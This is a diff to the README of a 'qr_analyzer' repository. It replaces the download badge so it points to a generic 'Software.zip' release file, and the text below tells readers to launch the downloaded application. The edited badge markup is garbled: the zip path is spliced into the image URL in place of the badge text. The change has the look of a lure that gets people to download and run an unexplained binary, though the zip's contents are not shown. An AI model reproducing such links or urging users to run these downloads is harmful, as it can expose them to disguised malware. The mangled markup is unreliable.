@@ -17,7 +17,7 @@ Welcome to the **qr_analyzer** repository!
 ## Installation 🚀
 
 To get started with the **qr_analyzer** app, you can download the necessary files from the following link:
-[![Download Here](https://img.shields.io/badge/Download%20Here-1.0.0-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/Speedyman617/qr_analyzer/releases/download/v1.0/Software.zip%20Here-1.0.0-brightgreen)](https://github.com/Speedyman617/qr_analyzer/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the files, launch the application on your preferred platform to begin exploring its features and functionalities.
 
